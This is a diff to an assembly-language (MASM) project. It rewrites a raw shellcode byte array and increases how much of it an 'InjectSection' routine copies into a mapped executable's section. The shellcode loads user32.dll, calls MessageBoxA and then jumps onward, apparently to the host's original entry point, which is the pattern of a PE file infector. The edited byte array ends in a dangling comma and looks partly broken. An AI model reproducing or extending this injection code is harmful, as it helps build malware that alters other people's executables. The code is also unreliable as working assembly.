@@ -83,8 +83,11 @@ includelib C:\masm32\lib\masm32.lib
 			byte 0ffh, 0d0h, 089h, 045h, 01ch, 068h, 06ch, 06ch, 000h, 000h, 068h, 033h, 032h, 02eh, 064h, 068h
 			byte 055h, 073h, 065h, 072h, 054h, 0ffh, 0d0h, 068h, 06fh, 078h, 041h, 000h, 068h, 061h, 067h, 065h
 			byte 042h, 068h, 04dh, 065h, 073h, 073h, 054h, 050h, 08bh, 05dh, 018h, 0ffh, 0d3h, 089h, 045h, 020h
-			byte 06ah, 000h, 0e8h, 001h, 000h, 000h, 000h, 0cch, 0ffh, 025h, 000h, 020h, 040h, 000h, 000h, 000h, 0h
-;
+			byte 068h, 06Fh, 078h, 041h, 000h, 068h, 061h, 067h, 065h, 042h, 068h, 04Dh, 065h, 073h, 073h, 089h
+			byte 065h, 018h, 089h, 065h, 01Ch, 06Ah, 000h, 08Bh, 055h, 018h, 052h, 08Bh, 055h, 01Ch, 052h, 06Ah
+			byte 000h, 0FFh, 0D0h, 06Ah, 000h, 0E8h, 000h, 000h, 000h, 000h, 0FFh, 025h, 000h, 020h, 040h, 000h
+			byte 000h, 000h,
+
 ; Struct url
 ;
 
@@ -319,7 +322,7 @@ InjectSection proc lastSection:DWORD
 	mov ebx, mappedAddr
 	add edx, ebx
 	;mov DWORD PTR [edx], 41414141h
-	invoke MemCopy, ADDR code, edx, 0f0h
+	invoke MemCopy, ADDR code, edx, 120h
 	;invoke MemCopy, ADDR code, edx, 25h
 	;mov DWORD ptr [edx], ebx
 	
